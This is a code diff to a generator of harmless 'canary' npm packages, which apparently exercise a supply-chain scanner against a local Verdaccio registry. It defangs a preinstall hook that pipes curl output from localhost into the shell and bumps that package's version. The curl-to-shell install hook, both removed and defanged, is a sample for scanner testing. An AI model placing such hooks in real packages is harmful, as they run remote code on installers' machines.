@@ -37,8 +37,11 @@ eval(code);`,
     },
   },
   "ladon-canary-curl": {
+    version: "1.0.1", // 1.0.0 piped to a real `sh`; bumped so a re-publish to Verdaccio replaces it
     attack: "preinstall pipes a remote script to the shell (to localhost)",
-    scripts: { preinstall: "curl -s http://127.0.0.1:4874/x.sh | sh || true" },
+    // `sh -n` only parses what it is fed and never executes it: the curl|sh shape is there for the
+    // scanner, but whatever happens to listen on 127.0.0.1:4874 cannot run code through this canary.
+    scripts: { preinstall: "curl -s http://127.0.0.1:4874/x.sh | sh -n || true; echo ladon-canary-curl ran >> /tmp/ladon-canary-pwned" },
     files: {},
   },
   "ladon-canary-child": {
@@ -108,7 +111,7 @@ for (const [name, c] of Object.entries(CANARIES)) {
   mkdirSync(dir, { recursive: true });
   const pkg = {
     name,
-    version: "1.0.0",
+    version: c.version ?? "1.0.0",
     description: `LADON DEMO CANARY — harmless. ${c.attack}. Local Verdaccio only.`,
     main: "index.js",
     license: "MIT",
